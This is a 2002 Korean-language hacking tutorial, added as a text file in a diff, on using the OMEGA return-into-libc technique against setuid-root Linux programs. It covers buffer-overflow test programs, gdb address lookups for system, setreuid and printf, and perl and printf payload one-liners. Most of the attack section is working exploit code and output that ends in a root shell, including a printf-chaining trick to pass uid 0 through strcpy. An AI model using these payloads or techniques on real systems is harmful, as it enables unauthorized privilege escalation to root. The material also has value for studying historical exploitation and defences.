@@ -1,0 +1,248 @@
+==================================================
+OMEGA Project에서 setuid의 적용
+
+2002/ 09/ 17
+
+hackerleon in Null@Root leon@null2root.org
+==================================================
+
+
+
+0x0 OMEGA의 유용
+----------------
+
+OMEGA Project는 쉘코드를 넣을 공간이 없거나 특히 쉘코드를 만들기 번거로운 환경에서 취약한 프로그램을 공략하여 쉘을 획득 할 수 있는 간편한 공격 방법이다.
+
+간략하게 시스템 라이브러리에 등록되어 프로그램이 실행되는 동안 로딩된 system() 함수의 위치를 찾아 우리가 원하는 메모리값(RET)을 system() 함수 위치로 변조한다면 우리는 쉘코드 작성 및 쉘코드의 위치를 알아내기 위한 부단한 노력을 한순간에 해결 할 수 있게 되었다.
+
+0x01 getuid
+
+Linux kernel 버젼 2.4.x 이상에서는 이전의 취약프로그램들으 보완 하기 위한 방법으로 setuid 프로그램이 실행됨에 있어서 해당 프로그램이 변조 또는 인터럽트 되어 다른 프로그램을 실행하려 할때 getuid를 실행하여 실행하는 user의 shell변수 안의 uid를 가져와서 변조된 프로그램을 실행토록 하고 있다.
+
+이와 같은 방어 방법은 쉘코드를 이용하여 공격할 시에는 간단하게 setreuid 코드를 쉘코드 앞에 삽입 함으로써 해결될수 있으나, 쉘코드를 이용하지 않는 race condition이나 환경변수 등의 취약성에서 프로그래머의 골칫거리를 어느정도 해결해준 방어 기법이라 할 수 있겠다.
+
+역시 마챦가지로 OMEGA 를 이용하여 취약프로그램을 공격할때 이에 대한 문제점이 발생한다.
+
+
+//test1.c
+
+main(int argc, char *argv[])
+{
+char buf[16];
+if(argc > 1)
+strcpy(buf,argv[1]);
+}
+
+$ls -l test1
+
+-rwsr-xr-x 1 root root 14491 Sep 17 11:49 test1
+
+$id
+
+uid=500(leon) gid=500(leon)
+
+위의 간단한 취약프로그램의 경우 OMEGA를 적용하여 kernel 버젼 2.4.x 이상에서 공격하여보도록 한다.
+
+$ gdb test1
+
+(gdb) b main
+Breakpoint 1 at 0x8048466
+(gdb) r
+Starting program: /home/leon/study/test1 
+
+Breakpoint 1, 0x08048466 in main ()
+(gdb) x/x $ebp
+0xbffffb08: 0xbffffb48
+(gdb) x/x system
+0x4006c584 <__libc_system>: 0x57e58955
+(gdb) x/s system+908184
+0x4014a120 <__clz_tab+2155>: "/bin/sh" <----------- lamagra의 exploit 응용 "/bin/sh" 찾기
+
+$ perl -e 'system "./test1","AAAAAAAAAAAAAAAAAAAA\x84\xc5\x06\x40\x41\x41\x41\x41\x20\xa1\x14\x40"'
+
+sh-2.05$ id
+uid=500(leon) gid=500(leon)
+
+예상 되었던 바 취약성을 공격하여 RET를 system() 으로 맞추고 "/bin/sh"를 실행 하였으나, getuid를 통하여공격자 자신의 쉘이 뜬것을 볼수 있다.
+
+0x02 setuid 의 실행
+-------------------
+
+프로그램의 실행흐름을 보면 RET위치에서 system() 함수가 call된 곳의 +4byte 위치의 아큐먼트를 인자로 실행하는것을 볼수 있다. 역시 마챦가지로 프로그램은 계속 실행되고 있는것이다. 그렇다면 RET에서 system()을 call하기전에 setuid를 call한다면 어떻게 될까?..
+
+정리해보면
+
+[buf][ebp][*setreuid][*system][UID][*/bin/sh] 로 공격해보려한다.
+
+$gdb 
+(gdb) b main
+Breakpoint 1 at 0x80486d6
+(gdb) r
+Starting program: /home/leon/study/test1 
+
+Breakpoint 1, 0x080486d6 in main ()
+(gdb) x/x system
+0x4006c584 <__libc_system>: 0x57e58955
+(gdb) x/x setreuid
+0x40103db4 <__setreuid>: 0x56e58955
+(gdb)
+
+$ perl -e 'system "./test1","AAAAAAAAAAAAAAAAAAAA\xb4\x3d\x10\x40\x84\xc5\x06\x40\x01\x01\x01\x01\x20\xa1\x14\x40"'
+
+sh-2.05$ id
+
+uid=16843009 gid=500(leon)
+
+위와 같이 실행한 결과 16진수 0x01010101 = > dec : 16843009 
+
+의 값이 uid로 적용된것을 볼수 있다...
+
+그러나 우리가 uid=0 의 값을 얻기 위해서는 해당 16진수 값을 0x00000000 를 넣어야 한다는 문제를 안고있는것이다.
+
+$ perl -e 'system "./test1","AAAAAAAAAAAAAAAAAAAA\xb4\x3d\x10\x40\x84\xc5\x06\x40\x00\x00\x00\x00\x20\xa1\x14\x40"'
+sagmentation fault
+
+해당 취약프로그램의 경우 변수의 입력은 "strcpy" 함수로 입력받는것을 볼수 있는데 이때, 스트링의 값이 0x00 일경우는 스트링이 터미네이팅 되는것을 알수있다.(stack guard 참고) 즉, strcpy를 사용하여 변수를 입력받는 경우 우리는 우리가 원하는 "uid=0" 를 획득하지 못한다는것을 알수 있다.
+
+
+0x03 여러가지 입력함수
+----------------------
+
+//test2.c
+main()
+{
+char buf[16];
+scanf("%s",buf);
+}
+
+$ls -l test2
+-rwsr-xr-x 1 root root 11391 Sep 17 11:51 test2
+
+
+자! 이번엔 strcpy 가 아닌 scanf() 함수인 경우는 어떻게 될까?
+역시 동일한 방법으로 공격해보도록 하자!..이경우 라이브러리 안의 "/bin/sh"의 위치가 "0x4014a120"에 존재하는데 "0x20"이 터미네이팅 되는 관계로 뒤쪽에 "/bin/sh" 넣어서 쉘을 실행하였다. 
+
+[buf][ebp][*setreuid][*system][0x00][*/bin/sh][junk][/bin/sh]
+
+$ (printf "AAAAAAAAAAAAAAAAAAAA\xb4\x3d\x10\x40\x84\xc5\x06\x40\x00\x00\x00\x00\x10\xfb\xff\xbf\x41\x41\x41\x41/bin/sh";cat)|./test2
+
+0xbffffae8 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+0xbffffaf8 41 41 41 41 b4 3d 10 40 84 c5 06 40 00 00 00 00 AAAA.=.@...@....
+0xbffffb08 10 fb ff bf 41 41 41 41 2f 62 69 6e 2f 73 68 00 ....AAAA/bin/sh.
+
+id
+uid=0(root) gid=0(root)
+
+uid=0를 획득하였다.. scanf 함수의경우 Null 문자를 넣을수가 있었다, 따라서 uid=0의 획득이 가능하다.
+
+setuid=0 가 아닌 취약프로그램의 경우는 setreuid(UID,UID)를 넣어야 하므로 "/bin/sh"의 위치를 오버하는 위치에 한번의 UID를 더 넣어야 한다. 이경우는 직접 /bin/sh를 실행 할수 없으므로 링크를 통한 방법으로 쉘을 획득 하여야 한다.
+
+
+위 테스트 결과 스트링을 직접입력 받는경우는 Null문자를 입력할수 있고 이경우 우리가 원하는 setuid를 획득할수 있다는 것을 알 수 있다. 그러나 strcpy 와 같이 입력된 문자를 다시 copy해오는 경우는 setuid를 획득 할수 없다......BUT 뜨~~~~ ^^
+
+0x04 uid=0 너를 불러주마!!!
+---------------------------
+
+그러나 그렇다고 포기하면 해커가 아니다...
+
+자...test1에서 메모리를 잠시 덤프하여 살펴보도록 한다..
+
+//test1.c
+#include "dumpcode.h"
+
+main(int argc, char *argv[])
+{
+char buf[16];
+if(argc > 1)
+strcpy(buf,argv[1]);
+dumpcode(buf,64);
+}
+
+$./test1 AAAA
+
+0xbffffae8 41 41 41 41 00 84 04 08 94 97 04 08 9c 98 04 08 AAAA............
+0xbffffaf8 38 fb ff bf 07 95 03 40 02 00 00 00 64 fb ff bf 8......@....d...
+0xbffffb08 70 fb ff bf 42 83 04 08 40 87 04 08 00 00 00 00 p...B...@.......
+0xbffffb18 38 fb ff bf f1 94 03 40 00 00 00 00 70 fb ff bf 8......@....p...
+
+눈꺼풀을 뒤잡어서 함보자....분명히 RET이후에 공간에 00 00 00 00 이 보인다..
+이것은 프로그램의 종료등을 나타내는 인터럽트인데 이넘을 잘이용해보면 우리가 원하는 uid=0 를 획득할 수 있지 않을꺼나?...^^
+
+자!!!..어케 할 꺼나..
+
+우리는 위에서 system 를 호출하기전에 setreuid를 호출한것을 기억한다..즉, 프로그램은 계속 쭉....실행된다는것을 알수 있다...따라서 00 00 00 00 이 있는곳 까지..임의의 라이브러리 함수를 계속 call한후 00 00 00 00 가 인자로 들어갈 위치에서 setreuid 와 system를 호출하면 어케될까?..
+
+우리는 여기서 별탈없을 printf 를 계속 호출하기로 한다..
+
+$ gdb test1
+
+(gdb) b main
+Breakpoint 1 at 0x80486d6
+(gdb) r
+Starting program: /home/leon/study/test1 
+/bin/bash: /root/.bashrc: Permission denied
+
+Breakpoint 1, 0x080486d6 in main ()
+(gdb) x/x system
+0x4006c584 <__libc_system>: 0x57e58955
+(gdb) x/x setreuid
+0x40103db4 <__setreuid>: 0x56e58955
+(gdb) x/x printf
+0x4007cd04 <printf>: 0x53e58955
+(gdb)
+
+자...
+
+첫번째 00 00 00 00 앞으로...공격
+
+$ perl -e 'system "./test1","AAAAAAAAAAAAAAAAAAAA\x04\xcd\x07\x40\x04\xcd\x07\x40\x04\xcd\x07\x40\x04\xcd\x07\x40\xb4\x3d\x10\x40\x84\xc5\x06\x40"' 
+0xbffffac8 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+0xbffffad8 41 41 41 41 04 cd 07 40 04 cd 07 40 04 cd 07 40 AAAA...@...@...@
+0xbffffae8 04 cd 07 40 b4 3d 10 40 84 c5 06 40 00 00 00 00 ...@.=.@...@....
+0xbffffaf8 18 fb ff bf f1 94 03 40 00 00 00 00 50 fb ff bf .......@....P...
+
+$ 
+
+음... 안되는군... 왜그런지는 나중에 보고... 이번에는 두번째 00 00 00 00 으로 공격
+
+
+$ perl -e 'system "./test1","AAAAAAAAAAAAAAAAAAAA\x04\xcd\x07\x40\x04\xcd\x07\x40\x04\xcd\x07\x40\x04\xcd\x07\x40\x04\xcd\x07\x40\x04\xcd\x07\x40\x04\xcd\x07\x40\xb4\x3d\x10\x40\x84\xc5\x06\x40"'
+0xbffffab8 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+0xbffffac8 41 41 41 41 04 cd 07 40 04 cd 07 40 04 cd 07 40 AAAA...@...@...@
+0xbffffad8 04 cd 07 40 04 cd 07 40 04 cd 07 40 04 cd 07 40 ...@...@...@...@
+0xbffffae8 b4 3d 10 40 84 c5 06 40 00 00 00 00 40 fb ff bf .=.@...@....@...
+
+sh: ?딢??딢 :command not found
+
+아싸!!! 쉘이 실행되었다...
+
+그럼 링크를 걸자.. 우선 PATH부터 맞추고
+
+$ PATH=$PATH:./
+
+$ perl -e 'system "./test1","AAAAAAAAAAAAAAAAAAAA\x04\xcd\x07\x40\x04\xcd\x07\x40\x04\xcd\x07\x40\x04\xcd\x07\x40\x04\xcd\x07\x40\x04\xcd\x07\x40\x04\xcd\x07\x40\xb4\x3d\x10\x40\x84\xc5\x06\x40"' 2> file
+
+$ ./lnk file <---------- lnk는 lamagra의 링커 프로그램이다.
+
+filename = j?웠&#65533;퓪?였?옛?퓖?퓼?옌?왔
+
+$ perl -e 'system "./test1","AAAAAAAAAAAAAAAAAAAA\x04\xcd\x07\x40\x04\xcd\x07\x40\x04\xcd\x07\x40\x04\xcd\x07\x40\x04\xcd\x07\x40\x04\xcd\x07\x40\x04\xcd\x07\x40\xb4\x3d\x10\x40\x84\xc5\x06\x40"'
+
+# id
+uid=0(root) gid=500(leon)
+
+되었네...^^
+
+RET이후 어는곳에 00 00 00 00 이 들어있는지는 정확히 알수 없으나..
+
+[buf][ebp][printf1][printf2][printf...][setreuid][system]
+
+의 방식으로 계속 뒤지다 보면 uid=0의 쉘을 획득할 수 있다.
+
+주저리 주저리 많이 떠들었으나 어찌되었든 OMEGA를 이용해서 getuid 시스템 하에서도 충분히 setuid를 획득 할 수 있다는 가능성을 알아보았다..
+
+그럼..즐핵...
+
+혹..뭐 틀린거 있음 리플주시거나 leon@null2root.org로 멜주세요..
+
+_eof 
